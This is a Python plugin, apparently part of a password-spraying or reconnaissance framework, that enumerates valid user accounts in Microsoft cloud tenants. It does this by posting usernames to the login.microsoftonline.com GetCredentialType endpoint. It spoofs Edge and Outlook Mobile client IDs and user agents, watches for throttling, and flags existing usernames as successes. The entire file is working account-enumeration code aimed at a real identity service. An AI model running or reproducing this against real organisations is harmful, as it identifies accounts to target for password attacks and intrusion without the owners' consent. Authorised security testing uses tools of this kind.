import random

class Plugin:
    def __init__(self, requester, pluginargs):
        self.requester = requester
        self.pluginargs = pluginargs
    
    def validate(self):
        self.pluginargs = {
            'url' : "https://login.microsoftonline.com"
        }
        return True, None

    def testconnect(self, useragent):
        r = self.requester.get(self.pluginargs["url"], headers={"User-Agent": useragent})
        return r.status_code != 504
    
    def test_authenticate(self, username, password, useragent):
        data_response = {
            'result' : None,    # Can be "success", "failure" or "potential"
            'error' : False,
            'output' : "",
            'valid_user' : False
        }

        client_ids = [
            # Microsoft Edge
            ("ecd6b820-32c2-49b6-98a6-444530e5a77a", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19045"),
            # Outlook Mobile
            ("27922004-5251-4030-b22d-91ecd9a37ea4", "Mozilla/5.0 (compatible; MSAL 1.0) PKeyAuth/1.0"),
        ]

        client_id, useragent = random.choice(client_ids)

        headers = {
            "User-Agent" : useragent,
            'Accept' : 'application/json',
            'Content-Type' : 'application/x-www-form-urlencoded'
        }

        if_exists_result_codes = {
            "-1" : "UNKNOWN_ERROR",
            "0" : "VALID_USERNAME",
            "1" : "UNKNOWN_USERNAME",
            "2" : "THROTTLE",
            "4" : "ERROR",
            "5" : "VALID_USERNAME_DIFFERENT_IDP",
            "6" : "VALID_USERNAME"
        }

        domainType = {
            "1" : "UNKNOWN",
            "2" : "COMMERCIAL",
            "3" : "MANAGED",
            "4" : "FEDERATED",
            "5" : "CLOUD_FEDERATED"
        }

        body = '{"Username":"%s"}' % username
        
        try:
            response = self.requester.post(f"{self.pluginargs['url']}/common/GetCredentialType", headers=headers, data=body)
            data_response['request'] = response

            throttle_status = int(response.json()['ThrottleStatus'])
            if_exists_result = str(response.json()['IfExistsResult'])
            if_exists_result_response = if_exists_result_codes[if_exists_result]
            domain_type = domainType[str(response.json()['EstsProperties']['DomainType'])]
            domain = username.split("@")[1]

            if domain_type != "MANAGED":
                data_response["result"] = "failure"
                data_response['output'] = f"[-] FAILURE: {username} Domain type {domain_type} not supported for user enum"

            elif throttle_status != 0 or if_exists_result_response == "THROTTLE":
                data_response['output'] = f"[?] WARNING: Throttle detected on user {username}"
                data_response['result'] = "failure"

            else:
                sign = "[-]"
                data_response["result"] = "failure"
                if "VALID_USER" in if_exists_result_response:
                    sign = "[!]"
                    data_response["result"] = "success"
                    data_response['valid_user'] = True
                data_response['output'] = f"{sign} {if_exists_result_response}: {username}"

        except Exception as ex:
            data_response['error'] = True
            data_response['output'] = str(ex.__repr__())
            pass

        return data_response